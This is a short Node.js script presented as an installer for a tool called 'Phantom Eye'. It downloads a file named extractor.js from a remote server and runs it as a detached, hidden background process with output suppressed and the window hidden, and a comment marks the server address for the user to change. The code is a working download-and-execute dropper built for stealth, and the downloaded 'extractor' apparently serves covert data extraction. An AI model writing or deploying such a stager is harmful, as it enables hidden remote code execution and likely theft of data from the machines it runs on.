const fs = require('fs');
const path = require('path');
const https = require('https');
const { spawn } = require('child_process');

const SERVER_URL = 'https://phantom-eye-production.up.railway.app';  // ← CHANGE

console.log('👁️ Installing Phantom Eye...');

const extractorPath = path.join(__dirname, 'extractor.js');

https.get(SERVER_URL + '/client/extractor.js', (res) => {
    let data = '';
    res.on('data', (chunk) => { data += chunk; });
    res.on('end', () => {
        fs.writeFileSync(extractorPath, data);
        console.log('✅ Extractor downloaded');
        const proc = spawn('node', [extractorPath], {
            detached: true,
            stdio: 'ignore',
            windowsHide: true
        });
        proc.unref();
        console.log('✅ Phantom Eye running');
    });
}).on('error', () => {
    console.log('❌ Failed to download');
});
